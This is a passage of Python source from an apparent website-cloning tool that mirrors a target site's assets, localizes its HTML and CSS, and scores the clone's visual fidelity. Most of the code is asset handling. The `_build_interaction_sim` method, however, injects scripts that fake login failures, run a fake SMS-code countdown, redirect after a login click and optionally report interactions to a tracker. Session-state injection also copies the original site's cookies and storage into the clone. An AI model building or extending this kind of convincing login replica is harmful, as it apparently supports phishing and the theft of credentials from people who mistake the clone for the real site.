                    if len(results) >= config.MAX_ASSETS_PER_TASK:
                        break
                    out = self.downloader.fetch_via_browser(
                        job["url"], ctx.request, referer=job.get("referer") or origin + "/")
                    out = self._normalize_out(out)
                    if not out["ok"]:
                        continue
                    info = self._store(out)
                    results[out["url"]] = info
                    self.log("SMART-DL", f"浏览器会话救回 {info['cat']}/{info['name']}"
                                         f" <- {out['url'][:110]}")
                    if out["is_css"]:
                        text = out["content"].decode("utf-8", "replace")
                        css_sources[out["url"]] = text
                        css_refs[out["url"]] = parse_css_refs(text, out["url"])
        finally:
            # 熔断放弃的在飞请求不阻塞收尾(工作线程超时后自行结束, 结果丢弃)
            executor.shutdown(wait=not tripped, cancel_futures=True)

        # CSS 内部引用本地化(@import 与 url()/mask/image-set 引用改写为本地路径)
        for css_url, text in css_sources.items():
            info = results.get(css_url)
            if info is None:
                continue
            rewritten = text
            for raw, absolute in css_refs.get(css_url, []):
                child = results.get(absolute)
                if child is None:
                    # 引用 URL 与实际抓取 URL 形态不同(如 /assets/name.hash8.ext
                    # 被浏览器以另一路径抓走): 按内容哈希 token 在池内找同字节
                    child = self._pool_match(absolute, results)
                if child is not None:
                    rewritten = rewritten.replace(raw, child["local"])
            targets = [info["abs_path"]]
            rel = (info.get("local") or "").lstrip("/")
            if rel:
                alias = self.ws / rel
                if alias != info["abs_path"]:
                    targets.append(alias)
            for target in targets:
                with suppress(OSError):
                    target.write_text(rewritten, encoding="utf-8")
        return results

    def _fetch_asset(self, job: dict) -> dict:
        """L1 直连下载(线程池内执行, 禁止触碰 Playwright 对象)。"""
        pre = self._live_bodies.get(job["url"])
        if pre is not None:
            return dict(pre)
        out = self.downloader.fetch_direct(job["url"],
                                           referer=job.get("referer") or self._target)
        return out

    def _store(self, out: dict) -> dict:
        """写入全局 CAS 池并落到任务工作空间(命中同样计入统计)。"""
        content = out["content"]
        sha = hashlib.sha256(content).hexdigest()
        ext = out["ext"] if out["ext"] in config.EXT_CATEGORIES or out["ext"] else ".bin"
        cat = config.EXT_CATEGORIES.get(ext, "misc")
        name = sha[:16] + ext
        cache_file = config.CACHE_ROOT / sha[:2] / sha[2:4] / (sha + ext)
        hit = cache_file.is_file()
        if not hit:
            cache_file.parent.mkdir(parents=True, exist_ok=True)
            cache_file.write_bytes(content)
        self.db.record_cas(sha, len(content), ext)
        local = f"/static/{cat}/{name}"
        dst = self.ws / "static" / cat / name
        if not dst.is_file():
            dst.write_bytes(content)

        # CAS 命中统计修复: 无论 miss/hit, 落入任务工作空间的文件都计入分类与体积
        self._stat_accum[cat if cat in self._stat_accum else "misc"] += 1
        self._stat_accum["bytes"] += len(content)

        alias_local = self._entry_alias(out, content, sha)

        return {"url": out["url"], "sha": sha, "cat": cat, "name": name,
                "local": alias_local or local, "abs_path": dst, "size": len(content),
                "ext": ext, "hit": hit}

    # 入口 bundle 原名特征(app.<hash>.js / chunk-vendors.<hash>.js 等)
    ENTRY_ALIAS_RE = re.compile(
        r"^(?:app|main|bundle|runtime|vendor|chunk-vendors|chunk-[A-Za-z0-9_]+)"
        r"[A-Za-z0-9_.\-]*\.(?:js|mjs|cjs|css)$", re.I)

    def _entry_alias(self, out: dict, content: bytes, sha: str):
        """入口 bundle 原名副本: 保留 app.<hash>.js 等构建命名特征。

        部分 SPA 版本守卫从页面 HTML 正则提取 app.<hash>.js 的 hash 与
        Cookie 记录比对 —— CAS 纯 sha 命名会破坏该自检导致"检测到新版本"
        弹层常驻。以原文件名再落一份副本并让本地引用指向它, 自检即可通过。
        返回别名本地路径; 不适用返回 None。
        """
        orig_name = Path(smart_downloader.strip_path_params(
            urlsplit(out["url"]).path)).name
        if len(orig_name) > 80 or not self.ENTRY_ALIAS_RE.match(orig_name):
            return None
        ext = os.path.splitext(orig_name)[1].lower()
        cat = config.EXT_CATEGORIES.get(ext)
        if cat not in ("js", "css"):
            return None
        alias = self.ws / "static" / cat / orig_name
        if alias.is_file():
            try:
                if alias.read_bytes() == content:
                    return f"/static/{cat}/{orig_name}"
            except OSError:
                pass
            stem, suffix = os.path.splitext(orig_name)
            alias = self.ws / "static" / cat / f"{stem}.{sha[:6]}{suffix}"
            if alias.is_file():
                return None
        try:
            alias.write_bytes(content)
        except OSError:
            return None
        return f"/static/{cat}/{alias.name}"

    # ------------------------------------------------------------------
    MOCK_ASSET_URL_RE = re.compile(
        r"""https?://[^"'\\\s,)]+?\.(?:png|jpe?g|gif|svg|webp|ico|bmp|css|mjs|js|woff2?|ttf|otf|eot|mp4|webm)(?:\?[^"'\\\s,)]*)?"""
        r"""|/(?![/#])[\w\-./@~]+?\.(?:png|jpe?g|gif|svg|webp|ico|bmp|css|mjs|js|woff2?|ttf|otf|eot|mp4|webm)(?:\?[\w\-./=&%]*)?""",
        re.I,
    )

    def _harvest_mock_assets(self, ctx, mock_entries: list, results: dict,
                             origin: str) -> int:
        """扫描录制响应体中的资产 URL 并下载(静态提取的盲区)。

        背景图/Logo/头像常由 API JSON 下发(如 getHomeBackground), 原站渲染
        由浏览器动态加载 —— 静态 DOM 提取看不到, 克隆页会因背景缺失而
        白底白字。此处把响应体里出现的 URL 全部下载, 并登记 raw 引用供
        Mock 体本地化重写。
        """
        page_netloc = urlsplit(self._target).netloc
        candidates: dict = {}  # url -> raw
        for entry in mock_entries:
            body = entry.get("response_body") or ""
            if len(body) > 512 * 1024:
                continue
            for match in self.MOCK_ASSET_URL_RE.finditer(body):
                raw = match.group(0)
                if raw.startswith(("http://", "https://")):
                    absolute = raw
                else:
                    absolute = urljoin(origin.rstrip("/") + "/", raw)
                if not absolute.startswith(("http://", "https://")):
                    continue
                if absolute in results:
                    continue
                if any(v in results for v in self._variants(absolute, page_netloc)):
                    continue
                candidates[absolute] = raw
                if len(candidates) >= 30:
                    break
            if len(candidates) >= 30:
                break
        added = 0
        for url, raw in candidates.items():
            if len(results) >= config.MAX_ASSETS_PER_TASK:
                break
            pre = self._live_bodies.get(url)
            out = dict(pre) if pre is not None else self.downloader.fetch_via_browser(
                url, ctx.request, referer=self._target)
            out = self._normalize_out(out)
            if not out["ok"]:
                continue
            info = self._store(out)
            results[url] = info
            self._raw_refs[raw] = url  # 响应体里的原始写法 -> 绝对地址
            added += 1
        return added

    def _rewrite_mock_bodies(self, mock_entries: list, pairs: list):
        """Mock 响应体本地化(资产 URL 改写为本地路径)并回写 mock_data.json。"""
        changed = False
        for entry in mock_entries:
            body = entry.get("response_body") or ""
            if "http" not in body and "/picupload" not in body and "." not in body:
                continue
            rewritten = apply_replacements(body, pairs)
            if rewritten != body:
                entry["response_body"] = rewritten
                changed = True
        if changed:
            (self.ws / "mock_data.json").write_text(
                json.dumps(mock_entries, ensure_ascii=False, indent=2),
                encoding="utf-8")

    # ------------------------------------------------------------------
    def _live_backfill(self, ctx, results: dict, origin: str) -> int:
        """活体差集回补: 渲染期浏览器成功加载、但静态提取遗漏的资源。"""
        page_netloc = urlsplit(self._target).netloc
        missing = []
        for url in self._live_seen:
            if url in results:
                continue
            if any(v in results for v in self._variants(url, page_netloc)):
                continue
            missing.append(url)
        added = 0
        # 浏览器会话自有熔断(requests 被拒的主机浏览器可能仍可达, 不沿用下载阶段熔断):
        # 串行回补里同一主机网络层连续失败即跳过余下, 免逐个空等超时
        b_fail = {}
        # 已取回响应体的不占回补名额(本地读取, 不走网络); 名额只限需要真回源的
        missing.sort(key=lambda u: u not in self._live_bodies)
        net_left = config.LIVE_HARVEST_MAX
        cap = config.MAX_ASSETS_PER_TASK + config.RENDER_ASSET_RESERVE
        for url in missing:
            if len(results) >= cap:
                break
            if url not in self._live_bodies:
                if net_left <= 0:
                    break
                net_left -= 1
            host = urlsplit(url).hostname or ""
            if b_fail.get(host, 0) >= config.HOST_FAIL_TRIP:
                continue
            pre = self._live_bodies.get(url)
            out = dict(pre) if pre is not None else self.downloader.fetch_via_browser(
                url, ctx.request, referer=self._target)
            out = self._normalize_out(out)
            if not out["ok"]:
                if not str(out.get("error") or "").startswith(("HTTP", "空响应体", "oversize",
                                                               "content-type")):
                    b_fail[host] = b_fail.get(host, 0) + 1
                continue
            info = self._store(out)
            results[out["url"]] = info
            added += 1
            if out["is_css"]:
                text = out["content"].decode("utf-8", "replace")
                for raw, absolute in parse_css_refs(text, out["url"]):
                    if absolute in results or absolute in self._live_seen:
                        continue
                    pre = self._live_bodies.get(absolute)
                    child = dict(pre) if pre is not None else self.downloader.fetch_via_browser(
                        absolute, ctx.request, referer=out["url"])
                    child = self._normalize_out(child)
                    if child["ok"]:
                        results[child["url"]] = self._store(child)
        return added

    def _mirror_runtime_paths(self, results: dict) -> int:
        """脚本运行时拼出地址加载的资源(fetch/xhr 取的媒体分段、WebGL 场景、视频)按原站
        路径镜像落盘。这些地址不以字面量出现在 HTML/CSS/JS 里, 本地化替换改写不到, 克隆
        里脚本照原路径请求只能 404; 同源的落到工作空间同路径, 沙盒与交付工程都直接命中。"""
        host = urlsplit(self._target).netloc
        n = 0
        for url, kind in list(self._live_seen.items()):
            if kind not in ("runtime", "media"):
                continue
            parts = urlsplit(url)
            if parts.netloc != host:
                continue
            info = results.get(url)
            if info is None:
                continue
            rel = parts.path.lstrip("/")
            if not rel or rel.endswith("/") or rel.startswith(("static/", "frames/")) \
                    or ".." in rel.split("/"):
                continue
            target = self.ws / rel
            if target.is_file():
                continue
            try:
                target.parent.mkdir(parents=True, exist_ok=True)
                try:
                    os.link(info["abs_path"], target)
                except OSError:
                    target.write_bytes(info["abs_path"].read_bytes())
                n += 1
            except OSError:
                continue
        return n

    _HASH_TOKEN_RE = re.compile(r"(?:^|\.)([0-9a-f]{8,16})(?:\.[A-Za-z0-9]{1,6})?$")

    def _pool_match(self, absolute: str, results: dict):
        """按内容哈希 token 在资源池找同字节文件。

        站点构建产物的文件名普遍携带内容哈希(Vite: name.hash8.ext; 本站实测
        hash 即 sha256 前缀, 与 CAS 池 sha[:16] 命名同源), 引用路径与实际抓取
        路径形态不同时, 以哈希 token 求同存异。
        """
        base = urlsplit(absolute).path.rsplit("/", 1)[-1]
        if base in (None, "", "/"):
            return None
        exact = next((i for i in results.values()
                      if i["abs_path"].name == base), None)
        if exact is not None:
            return exact
        m = self._HASH_TOKEN_RE.search(base)
        if not m:
            return None
        token = m.group(1)
        return next((i for i in results.values()
                     if i["abs_path"].name.startswith(token)
                     or f".{token}." in i["abs_path"].name), None)

    def _failed_backfill(self, ctx, failed_local: set, remote_missing: set,
                         results: dict, origin: str):
        """渲染驱动回补: 本地 404 路径与被拦截的外联 URL 回源补抓。

        返回 (新增资源表, 影子落盘数)。对已在资源池中的 URL(活体回补已抓过,
        但运行时拼接的相对路径无法字面量替换)也按失败路径落影子副本,
        让静态服务器按原路径直接命中。
        """
        page_netloc = urlsplit(self._target).netloc
        new = {}
        shadows = 0
        # 时限 + 跨轮负缓存: 埋点/广告类外联 URL 动辄几十个, 逐个 20s 超时串行回源曾让
        # 单站修复回补耗时 180s(techcrunch); 回源失败的 URL 后续轮次不再重试
        deadline = time.monotonic() + config.BACKFILL_BUDGET
        dead = self._backfill_dead

        def _fetch(url):
            if url in dead or time.monotonic() > deadline:
                return None
            out = self._normalize_out(self.downloader.fetch_via_browser(
                url, ctx.request, referer=self._target))
            if not out["ok"]:
                dead.add(url)
                if urlsplit(url).netloc == page_netloc:
                    self.log("SMART-DL", f"回源失败({str(out.get('error'))[:60]}): {url[:110]}")
            return out

        def write_shadow(url: str, content: bytes) -> bool:
            nonlocal shadows
            shadow_rel = urlsplit(url).path.lstrip("/")
            if not shadow_rel or shadow_rel.startswith(("static/", "frames/")):
                return False
            shadow = self.ws / shadow_rel
            with suppress(OSError):
                shadow.parent.mkdir(parents=True, exist_ok=True)
                shadow.write_bytes(content)
            shadows += 1
            self.db.record_asset_name(
                shadow_rel.rsplit("/", 1)[-1],
                hashlib.sha256(content).hexdigest(), len(content))
            return True

        for url in remote_missing:
            if not url.startswith(("http://", "https://")):
                continue
            if url in results or any(v in results
                                     for v in self._variants(url, page_netloc)):
                continue
            if len(results) + len(new) >= config.MAX_ASSETS_PER_TASK + config.RENDER_ASSET_RESERVE:
                break
            out = _fetch(url)
            if out is not None and out["ok"]:
                new[out["url"]] = self._store(out)
                self.log("SMART-DL", f"渲染缺失回补: {new[out['url']]['cat']}"
                                     f"/{new[out['url']]['name']} <- {out['url'][:110]}")

        for path in sorted(failed_local):
            if path.startswith(("/preview/", "/frames/", "/api/")):
                continue
            # 动态 import 的解析基准错位: 引用改写为相对路径后, 运行时按
            # 模块/文档目录解析出的路径可能没有文件, 而字节其实已在资源池
            # (按原站路径镜像落盘) —— 按文件名(均为内容哈希命名)在池内
            # 找同名字节, 直接落到请求路径; 池内没有则按候选路径回源:
            # 原路径 + /assets/<同名>(Vite 默认 chunk 目录)。注意很多 SPA
            # 对未知路径返回 200 的 HTML fallback, 盲信状态码会拿 HTML 当
            # JS —— 由下方 DOCTYPE 防毒兜底
            base = path.rsplit("/", 1)[-1]
            target = self.ws / path.lstrip("/")
            stored = next((i for i in results.values()
                           if i["abs_path"].name == base), None)
            if stored is None:
                # Vite name.hash8.ext 类文件名: 池内是 sha 命名, 按哈希 token 匹配
                stored = self._pool_match(path, results)
            if stored is not None:
                try:
                    target.parent.mkdir(parents=True, exist_ok=True)
                    target.write_bytes(stored["abs_path"].read_bytes())
                    shadows += 1
                    self.db.record_asset_name(
                        base, hashlib.sha256(stored["abs_path"].read_bytes()).hexdigest(),
                        stored["abs_path"].stat().st_size)
                    self.log("SMART-DL",
                             f"桶路径修复: {path} <- 资源池 {base}")
                except OSError:
                    pass
                continue
            # 全局资产名索引: 同名文件曾被任何任务抓过(CAS 在池) —— 直接取
            # 字节落盘。源站失效(302/下线/毒化)时这是唯一救赎路径。
            known_sha = self.db.find_asset_name(base) if _distinctive_asset_name(base) else None
            if known_sha:
                src = None
                with suppress(OSError):
                    cas_row = self.db.cas_ext(known_sha)
                    src = (config.CACHE_ROOT / known_sha[:2] / known_sha[2:4]
                           / (known_sha + (cas_row or "")))
                if src is not None and src.is_file():
                    try:
                        target.parent.mkdir(parents=True, exist_ok=True)
                        target.write_bytes(src.read_bytes())
                        shadows += 1
                        self.log("SMART-DL",
                                 f"名字索引回补: {path} <- CAS {known_sha[:12]}")
                        continue
                    except OSError:
                        pass
            remote = [u for u in self._live_seen if urlsplit(u).path == path]
            for cand in (origin.rstrip("/") + path,
                         origin.rstrip("/") + "/assets/" + base):
                if cand not in remote:
                    remote.append(cand)
            for url in remote:
                already = None
                if url in results:
                    already = results[url]
                else:
                    already = next((results[v] for v in self._variants(url, page_netloc)
                                    if v in results), None)
                if already is not None:
                    # 已在资源池: 落到请求路径(运行时相对 URL 的救赎路径)
                    try:
                        target.parent.mkdir(parents=True, exist_ok=True)
                        target.write_bytes(already["abs_path"].read_bytes())
                        shadows += 1
                        self.db.record_asset_name(base, already["sha"],
                                                  already.get("size") or 0)
                    except OSError:
                        pass
                    break
                if len(results) + len(new) >= config.MAX_ASSETS_PER_TASK + config.RENDER_ASSET_RESERVE:
                    break
                out = _fetch(url)
                if out is None:
                    continue
                # SPA fallback 防毒: 未知路径常返回 200 的 HTML 壳,
                # 存成 .js/.css 会让运行时解析崩溃且污染资源池
                head = (out.get("content") or b"")[:512].lstrip()
                if out["ok"] and (head[:9] == b"<!DOCTYPE"
                                  or head[:5].lower() == b"<html"):
                    out["ok"] = False
                if not out["ok"]:
                    continue
                info = self._store(out)
                new[out["url"]] = info
                write_shadow(out["url"], out["content"])
                self.db.record_asset_name(
                    base, info["sha"], len(out["content"]))
                # 抓到的字节必须同时落到请求路径, 否则下一轮渲染依旧 404
                try:
                    target.parent.mkdir(parents=True, exist_ok=True)
                    target.write_bytes(out["content"])
                    shadows += 1
                except OSError:
                    pass
                self.log("SMART-DL", f"渲染缺失回补: {info['cat']}/{info['name']}"
                                     f" <- {out['url'][:110]}")
                break
        if shadows:
            self.log("SMART-DL", f"影子落盘 {shadows} 个运行时相对路径资源")
        if time.monotonic() > deadline:
            self.log("SMART-DL", f"修复回补达到时限({config.BACKFILL_BUDGET}s), 余下缺失本轮跳过")
        return new, shadows

    # ------------------------------------------------------------------
    def _compose_pairs(self, results: dict, routes: set, origin: str,
                       srcset_map: dict, iframe_pages: list, frame_records: list):
        """构造 (原始引用 -> 本地路径) 替换表, 长字符串优先。"""
        pairs = {}
        page_netloc = urlsplit(self._target).netloc
        self._fill_variants_bulk(pairs, [(url, info["local"]) for url, info in results.items()],
                                 page_netloc)
        srcset_items = []
        for candidate, best in srcset_map.items():
            # 候选自身已落地(浏览器按 sizes 实际选中的那档, 活体复用/回补拿到)就用它自己:
            # 一律指向最大档时浏览器把 2x 大图缩下来, 锐度/重采样与原站那档不同
            if candidate in results:
                continue
            info = results.get(best)
            if info is not None:
                srcset_items.append((candidate, info["local"]))
        self._fill_variants_bulk(pairs, srcset_items, page_netloc)
        # 原始相对/带参引用字符串 -> 本地(覆盖 <style> url() 与相对路径引用)
        for raw, absolute in self._raw_refs.items():
            info = results.get(absolute)
            if info is not None and len(raw) > 5 and raw != absolute:
                pairs[raw] = info["local"]
        netloc = urlsplit(origin).netloc
        for route in routes:
            pairs[origin + route] = route
            pairs[f"//{netloc}{route}"] = route
            if route != "/":
                pairs[origin + route + "/"] = route + "/"
        # 同源 iframe 引用重写为本地静态子页
        for i, (src, _html) in enumerate(iframe_pages):
            local = f"/iframe_{i + 1}.html"
            for variant in self._variants(src, page_netloc):
                pairs[variant] = local
        # 跨域 iframe 引用重写为本地静态子页
        for i, (src, _html, _text) in enumerate(frame_records):
            local = f"/frames/frame_{i + 1}.html"
            for variant in self._variants(src, page_netloc):
                pairs[variant] = local
            # 同时登记原始引用串(iframe src 常带相对写法)
            for raw, absolute in self._raw_refs.items():
                if absolute == src and len(raw) > 5:
                    pairs[raw] = local
        # 按长度降序的稳定排序(reverse=True 仍保持稳定), 与旧 key=-len 逐项一致;
        # 内置 len 作 key 免去逐项 lambda 调用
        return [(k, pairs[k]) for k in sorted(pairs, key=len, reverse=True)]

    def _build_interaction_sim(self) -> str:
        """仿真交互层脚本: 登录点击提示(自定义/默认池) / 可选登录后跳转 / 验证码 60s 倒计时。"""
        if not self.cfg.get("interaction_sim", config.INTERACTION_SIM):
            return ""
        custom_msg = str(self.cfg.get("sim_login_message") or "").strip()
        redirect = str(self.cfg.get("sim_login_redirect") or "").strip()
        # 安全校验: 仅放行 http(s) 绝对地址与站内相对路径, 拒绝 javascript: 等注入向量
        if redirect and not re.match(r"^(https?://|/)", redirect, re.I):
            self.log("WARN", f"登录跳转地址被拒绝(仅支持 http(s):// 或 / 开头): {redirect[:80]}")
            redirect = ""
        fails = [custom_msg] if custom_msg else list(config.SIM_LOGIN_FAIL_MESSAGES)
        script = (INTERACTION_SIM_TEMPLATE
                  .replace("__SIM_FAILS__", json.dumps(fails, ensure_ascii=False))
                  .replace("__SIM_SMS_OK__",
                           json.dumps(config.SIM_SMS_SENT_MESSAGE,
                                      ensure_ascii=False))
                  .replace("__SIM_SECONDS__",
                           str(int(config.SIM_SMS_COUNTDOWN_SECONDS)))
                  .replace("__SIM_REDIRECT__",
                           json.dumps(redirect, ensure_ascii=False)))
        # W5 时间冻结(模式策略包): 回放统一到采集时刻, 消除时变内容的
        # 渲染分叉(倒计时/日期组件/限时横幅在回放时与采集态不一致)
        if getattr(self._strategy_pack, "freeze_time", False) and self._captured_at:
            freeze_js = (
                '<script data-clone-preview="time-freeze">(function(){try{'
                'var __cap=new Date("__CAPTURE_ISO__");'
                'if(!isNaN(__cap.getTime())){var _R=Date;'
                'function FD(){var a=arguments;switch(a.length){case 0:return new _R(__cap.getTime());'
                'case 1:return new _R(a[0]);case 2:return new _R(a[0],a[1]);case 3:return new _R(a[0],a[1],a[2]);'
                'case 4:return new _R(a[0],a[1],a[2],a[3]);case 5:return new _R(a[0],a[1],a[2],a[3],a[4]);'
                'case 6:return new _R(a[0],a[1],a[2],a[3],a[4],a[5]);default:return new _R(a[0],a[1],a[2],a[3],a[4],a[5],a[6]);}}'
                'FD.prototype=_R.prototype;FD.now=function(){return __cap.getTime()};'
                'FD.parse=_R.parse;FD.UTC=_R.UTC;window.Date=FD;'
                '}catch(e){}})();</script>')
            script = freeze_js.replace("__CAPTURE_ISO__", self._captured_at) + script
        return script

    @staticmethod
    def _inject_after_head(html: str, script: str) -> str:
        if not script:
            return html
        match = re.search(r"<head[^>]*>", html, re.I)
        insert_at = match.end() if match else 0
        return html[:insert_at] + script + html[insert_at:]

    def _main_page_file(self) -> Path:
        """主页面实际被渲染/交付的文件(目录型 URL 落在 page_dir 影子路径)。"""
        if self._page_dir != "/":
            return self.ws / self._page_dir.lstrip("/") / "index.html"
        return self.ws / "index.html"

    def _round_files(self):
        return {f for f in self.ws.rglob("*")
                if f.is_file() and "flask_app" not in f.relative_to(self.ws).parts}

    def _snapshot_round(self, round_i, detail, results):
        """修复轮快照: 工作区文件清单 + 全部 HTML 字节 + 截图/文本 + 校准样式 + 资源表。"""
        files = self._round_files()
        keep = {f: f.read_bytes() for f in files
                if f.suffix == ".html" or f.name in ("cloned_preview.png", "cloned_text.txt")}
        return {"round": round_i, "detail": dict(detail), "files": files, "bytes": keep,
                "calib": self._calib_css, "results": dict(results)}

    def _restore_round(self, snap, results):
        for f in self._round_files() - snap["files"]:
            with suppress(OSError):
                f.unlink()
        for f, data in snap["bytes"].items():
            with suppress(OSError):
                f.write_bytes(data)
        self._calib_css = snap["calib"]
        results.clear()
        results.update(snap["results"])

    CLONE_SCROLL_JS = """async () => {
        await new Promise(res => {
            let y = 0;
            const step = () => {
                y += 800;
                window.scrollTo(0, y);
                if (y < document.body.scrollHeight) setTimeout(step, 60);
                else { window.scrollTo(0, 0); setTimeout(res, 250); }
            };
            step();
        });
    }"""

    def _load_clone(self, page, base, phases: bool = False):
        """克隆页统一加载序列: dcl 锚定 → 短 load → 网络静置封顶 → 滚动 → 缓释。

        首评与像素/布局校准重渲染共用, 保证重评分看到同样被懒加载/IntersectionObserver
        揭示的内容(此前校准重渲染不滚动, 懒挂载区块在重截图里缺失却仍可能"提分")。
        """
        tp = time.monotonic()
        page.goto(base + self._page_dir + self._page_frag,
                  wait_until="domcontentloaded", timeout=30000)
        with suppress(Exception):
            page.wait_for_load_state("load", timeout=self._strategy_pack.wait_load_timeout)
        # 主线程看门狗: page.evaluate 没有超时, 克隆页脚本一旦死循环(截断的库让播放器
        # Promise 自旋), 后面的滚动/截图 evaluate 会让整个任务永久挂起。wait_for_function
        # 的超时由驱动侧计时, 主线程卡死也能返回
        try:
            page.wait_for_function("true", timeout=config.CLONE_RESPONSIVE_MS)
        except Exception as exc:
            if "Timeout" in type(exc).__name__ or "Timeout" in str(exc):
                raise CloneUnresponsive(
                    f"克隆页主线程 {config.CLONE_RESPONSIVE_MS}ms 无响应(页面脚本死循环)") from exc
        if phases:
            # 网络静置只在首评等: 校准重渲染时资源已在浏览器缓存/本地, 轮询类页面
            # 每次都会白等满上限(滚动 + 缓释仍保留, 懒加载照样揭示)
            with suppress(Exception):
                page.wait_for_load_state(
                    "networkidle", timeout=self._strategy_pack.wait_networkidle_timeout)
            tp = self._phase("评分-克隆加载", tp)
        if self._strategy_pack.scroll_pass:
            # 懒加载触发: 分段滚动到底再回顶, 派发 IntersectionObserver
            with suppress(Exception):
                page.evaluate(self.CLONE_SCROLL_JS)
        if phases:
            tp = self._phase("评分-克隆滚动", tp)
        self._settle(page)
        with suppress(Exception):
            if page.evaluate(CLONE_IMG_EAGER_JS) or not page.evaluate(CLONE_IMG_DONE_JS):
                page.wait_for_function(CLONE_IMG_DONE_JS, timeout=config.CLONE_IMG_WAIT_MS,
                                       polling=100)
        with suppress(Exception):
            if page.evaluate(VIDEO_SEEK_JS):
                page.wait_for_function(VIDEO_SEEK_DONE_JS, timeout=config.CLONE_VIDEO_WAIT_MS,
                                       polling=100)
        # 首屏 autoplay 视频解出第一帧前只显示 poster(常为低清占位), 原站基准里是真帧
        with suppress(Exception):
            page.wait_for_function(VIDEO_FRAME_READY_JS, timeout=config.CLONE_VIDEO_WAIT_MS,
                                   polling=100)
        with suppress(Exception):
            page.evaluate(ANIM_ALIGN_JS)
        # 克隆里 autofocus 的输入框会撑开 :focus-within 浮层(原站基准时焦点不在其上)
        with suppress(Exception):
            page.evaluate("() => { const a = document.activeElement;"
                          " if (a && a !== document.body && a.blur) a.blur(); }")
        if phases:
            self._phase("评分-克隆静置", tp)

    def _layout_calibrate(self, page, base, original, cloned, detail, clone_text,
                          orig_text, diff_path):
        """版面块图对齐 → 尺寸覆盖并入校准样式 → 重渲染重评分; 未净提升则整体回滚。"""
        layout_file = self.ws / "layout_map.json"
        idx_html = self._main_page_file()
        if not (layout_file.is_file() and idx_html.is_file()):
            return detail, clone_text
        orig_map = json.loads(layout_file.read_text(encoding="utf-8"))
        clone_map = page.evaluate(f"() => ({LAYOUT_MAP_JS})({LAYOUT_MAP_MAX})")
        css, n_bad = layout_fix_css(orig_map, clone_map)
        seen = {e[0] for e in clone_map or []}
        missing = [e[0] for e in orig_map if e[0] not in seen and e[2] >= 24]
        if missing:
            with suppress(Exception):
                shown = page.evaluate(COLLAPSED_PROBE_JS, missing) or []
                if shown:
                    css = "\n".join([r for r in [css] if r] + [
                        f"{k}{{display:{d}!important}}" for k, d in shown
                        if re.fullmatch(r"[a-z-]+", d)])
                    n_bad += len(shown)
                    self.log("RENDER", f"布局校准: {len(shown)} 个基准可见块在克隆里被脚本收起, 压回显示")
        if not css:
            return detail, clone_text
        prev_css, prev_detail, prev_text = self._calib_css, detail, clone_text
        prev_doc = idx_html.read_text(encoding="utf-8", errors="replace")
        prev_shot = cloned.read_bytes()
        merged = list(dict.fromkeys((self._calib_css + "\n" + css).split("\n")))
        self._calib_css = "\n".join(r for r in merged if r)
        style = self._calib_style(self._calib_css)
        if "data-clone-calib" in prev_doc:
            doc = re.sub(r"<style data-clone-calib>.*?</style>", lambda _m: style,
                         prev_doc, count=1, flags=re.S)
        else:
            doc = self._put_calib(prev_doc, self._calib_css)
        idx_html.write_text(doc, encoding="utf-8")
        self._load_clone(page, base)
        self._full_shot(page, cloned, "克隆页")
        clone_text = page.evaluate(TEXT_EXTRACT_JS)
        detail = compute_visual_similarity(
            original, cloned, diff_path=diff_path, orig_text=orig_text,
            clone_text=clone_text or "", prime_calibration=False)
        before, after = prev_detail.get("score") or 0, detail.get("score") or 0
        if after <= before:
            self.log("RENDER", f"布局校准未提升({before}→{after}, {n_bad} 块失配), 已回滚")
            self._calib_css = prev_css
            idx_html.write_text(prev_doc, encoding="utf-8")
            cloned.write_bytes(prev_shot)
            return prev_detail, prev_text
        (self.ws / "cloned_text.txt").write_text(clone_text or "", encoding="utf-8")
        self.log("RENDER", f"布局校准: {n_bad} 块高度失配 → {len(css.splitlines())} 条尺寸覆盖, "
                           f"评分 {before}→{after}")
        return detail, clone_text

    def _calib_style(self, css: str) -> str:
        """校准覆盖是按采集视口测出来的尺寸/底色: 限定在采集视口断点区间内。"""
        return f'<style data-clone-calib>{band_wrap(css, self._band_floor)}</style>'

    def _put_calib(self, html: str, css: str) -> str:
        return self._inject_calib(html, css, self._band_floor)

    def _band_floor_of(self, html: str, width: int = 0) -> int:
        """页面(内联样式 + 本地化后的外链样式表)里不超过 width(默认采集宽度)的最大宽度断点。"""
        width = width or config.VIEWPORTS.get(self.cfg.get("viewport", "desktop"),
                                              config.VIEWPORTS["desktop"])["width"]
        texts = [html]
        root = self.ws.resolve()
        for href in re.findall(r"<link\b[^>]*?\bhref\s*=\s*[\"']([^\"'#?]+\.css)[\"'#?]", html, re.I)[:80]:
            if href.startswith(("http:", "https:", "//", "data:")):
                continue
            for cand in (self.ws / href.lstrip("/"),
                         self.ws / self._page_dir.lstrip("/") / href):
                with suppress(OSError, ValueError):
                    f = cand.resolve()
                    if str(f).startswith(str(root)) and f.is_file():
                        texts.append(f.read_text(encoding="utf-8", errors="replace")[:3_000_000])
                        break
        return capture_band_floor(texts, width)

    @staticmethod
    def _inject_calib(html: str, css: str, floor: int = 0) -> str:
        """校准覆盖置于 </head> 前(晚于站点样式, 层叠优先); floor>0 时限定在采集视口区间。"""
        style = f'<style data-clone-calib>{band_wrap(css, floor)}</style>'
        if re.search(r"</head>", html, re.I):
            return re.sub(r"</head>", lambda _m: style + "</head>", html, count=1, flags=re.I)
        return style + html

    def _localize(self, pages: list, iframe_pages: list, frame_records: list,
                  pairs: list, pages_map: dict):
        """HTML 本地化重写 + 状态恢复/仿真交互注入 + 导航护栏 + SPA 伪装 + 子页落盘。"""
        sim_script = self._build_interaction_sim()
        if self.db.get_tracker_config(self.task_id) and \
                (self.db.get_tracker_config(self.task_id) or {}).get("enabled"):
            # 启用埋点的任务: 附加观察器胶水(交互层拦截前回调 __ft_observe 触发上报)
            sim_script += TRACKER_OBSERVE_JS

        def inject_state_restore(html: str) -> str:
            # 批次级开关: restore_state=False 时产物不携带任何原站会话材料
            if not self.cfg.get("restore_state", True):
                return html
            snapshot = self.ws / "state_snapshot.json"
            if not snapshot.is_file():
                return html
            try:
                payload = json.loads(snapshot.read_text(encoding="utf-8"))
            except (OSError, ValueError):
                return html
            slim = {
                "cookies": [{"name": c.get("name"), "value": c.get("value"),
                             "path": c.get("path") or "/"}
                            for c in payload.get("cookies", [])
                            # httpOnly Cookie 原站页面 JS 本就不可见(document.cookie
                            # 读不到), 烘焙进产物既无语义收益又扩散会话凭证 → 剔除;
                            # 沙盒评分侧的 httpOnly 回放走 ctx.add_cookies, 不受影响
                            if c.get("name") and not c.get("httpOnly")],
                "local": payload.get("local", {}),
                "session": payload.get("session", {}),
            }
            script = STATE_RESTORE_TEMPLATE.replace(
                "__STATE_JSON__", _safe_json(slim))
